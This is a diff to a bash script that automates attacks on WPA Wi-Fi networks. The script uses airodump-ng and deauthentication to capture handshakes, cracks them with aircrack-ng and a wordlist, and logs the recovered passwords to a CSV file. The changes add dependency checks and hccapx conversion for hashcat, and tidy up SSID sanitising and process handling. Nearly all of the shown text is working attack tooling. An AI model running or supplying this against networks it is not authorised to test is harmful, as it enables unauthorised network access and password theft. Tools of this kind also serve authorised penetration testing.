@@ -30,6 +30,17 @@ sudo ./$(basename $0) --dict wordlist.txt
 EOF
 }
 
+program_exist(){
+    if [ ! `which iwconfig` ];then
+        echo "Program iwconfig not found,you need to install wireless-tools"
+        exit 1
+    fi
+    if [ ! `which aircrack-ng` ];then
+        echo "Program aircrack-ng not found,you need to install aircrack-ng"
+        exit 1
+    fi
+}
+
 get_iface(){
     iface=$(iwconfig 2>/dev/null | grep -i 'IEEE' | cut -d " " -f 1)
     if [ -z ${iface} ];then
@@ -57,7 +68,7 @@ start_monitor_mode(){
 get_ap_info(){
     ap_channel=$(cat ${temp_dir}/wifite-01.csv | grep ^${ap_bssid} | cut -d ',' -f 4)
     ap_ssid=$(cat ${temp_dir}/wifite-01.csv | grep ^${ap_bssid} \
-    | cut -d ',' -f 14 | sed 's/[^0-9a-zA-Z_]//g')
+    | cut -d ',' -f 14 | sed 's/[^0-9a-zA-Z_-]//g')
     expr ${ap_channel} + 0 &>/dev/null
     if [ $? -ne 0 ];then
         while true;do
@@ -68,7 +79,7 @@ get_ap_info(){
     if [ -z ${ap_ssid} ];then
         while true;do
             read -p 'Please select the ap ssid manually: ' ap_ssid
-            ap_ssid=$(echo ${ap_ssid} | sed 's/[^0-9a-zA-Z_]//g')
+            ap_ssid=$(echo ${ap_ssid} | sed 's/[^0-9a-zA-Z_-]//g')
             [ -z ${ap_ssid} ] || break
         done
     fi
@@ -109,14 +120,18 @@ handshake_check(){
     if [ $? -eq 0 ];then
         handshake_sig=0
         kill -15 ${airodump_pid[0]}
+        stop_monitor_mode
         apbssid=$(echo ${ap_bssid} | tr ":" "-")
         cap_time=$(date '+%M%S')
-        echo -e "\nSuccess!saved as ${cap_dir}/${ap_ssid}_${apbssid}_${cap_time}.cap"
-        stop_monitor_mode
-        cp ${temp_dir}/handshake-01.cap ${cap_dir}/${ap_ssid}_${apbssid}_${cap_time}.cap
+        cap_file=${cap_dir}/${ap_ssid}_${apbssid}_${cap_time}
+        cp ${temp_dir}/handshake-01.cap ${cap_file}.cap
+        if [ -x ${CURRENT_DIR}/cap2hccapx.bin ];then
+            ${CURRENT_DIR}/cap2hccapx.bin ${cap_file}.cap ${cap_file}.hccapx &>/dev/null
+        fi
+        echo -e "\nSuccess!saved as ${cap_file}.cap"
         if [ ! -z ${dict_file} ];then
             aircrack-ng -a 2 -w ${dict_file} -l ${temp_dir}/wpakey.txt \
-            -b ${ap_bssid} ${cap_dir}/${ap_ssid}_${apbssid}_${cap_time}.cap
+            -b ${ap_bssid} ${cap_file}.cap
             if [ -f ${temp_dir}/wpakey.txt ];then
                 password=$(cat ${temp_dir}/wpakey.txt)
                 echo "${ap_ssid},${apbssid},${password}" >> ${cracked_csv}
@@ -130,6 +145,7 @@ handshake_check(){
 # iface_mode=$(iwconfig ${1} 2>/dev/null | grep -oE 'Mode:[^ ]+')
 initialization(){
     confirm_run_as_root
+    program_exist
     get_iface
     stop_monitor_mode
     CURRENT_DIR=$(cd `dirname $0`;pwd)
@@ -151,9 +167,7 @@ scan_interface(){
     [ -n ${iface_mac} ] && start_monitor_mode
     sleep 1
     get_iface
-    airodump_cmd=(airodump-ng -a --write-interval 1 -w ${temp_dir}/wifite)
-    airodump_cmd[${#airodump_cmd[@]}]=${iface}
-    ${airodump_cmd[*]}
+    airodump-ng -a --write-interval 1 -w ${temp_dir}/wifite ${iface}
 }
 
 wpa_attack(){
@@ -171,8 +185,7 @@ wpa_attack(){
     ${airodump_cmd[*]} &>/dev/null &
     echo "Start sending deauth,please waiting..."
     sleep 5
-    airodump_pid=($(ps -ef | grep '^root.*airodump-ng' \
-    | sed 's/  */ /g' | cut -d ' ' -f 2))
+    airodump_pid=($(ps -ef | grep '^root.*airodump-ng' | awk '{print $2}'))
     while true;do
         handshake_check
         [ ${handshake_sig} -eq 0 ] && break
@@ -187,7 +200,7 @@ while true;do
             dict_file=$2
         else
             echo "Can't find dictionary,file $2 don't exist" 1>&2
-            echo "Option $1 must be an exiting dictionary file" 1>&2
+            echo "Option $1 must be an exist dictionary file" 1>&2
             exit 0
         fi
         shift;;
